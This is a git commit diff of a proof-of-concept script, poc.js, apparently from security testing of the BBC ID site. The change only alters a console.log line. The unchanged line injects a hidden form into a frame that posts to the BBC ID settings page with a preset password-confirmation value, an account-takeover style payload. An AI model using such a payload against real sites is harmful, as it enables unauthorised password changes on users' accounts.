918383b838f91221b6f38fbf05f2699532e107d7
shanekelly-bbc <shane.kelly@bbc.co.uk>
2015-12-18 12:39:11 +0000

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,2 +1,2 @@
-console.log("I'm here");
+console.log("I'm here ");
 window.frames[0].document.documentElement.innerHTML='<form action="https://ssl.bbc.co.uk/id/settings" name="frm1"> <input type="text" name="confirmpassword" value="loxnon28"> <input type="text" name="confirmpassword_confirm" value="loxnon28"> <input type="text" name="bbcid_submit_button" value="Save"></form>';
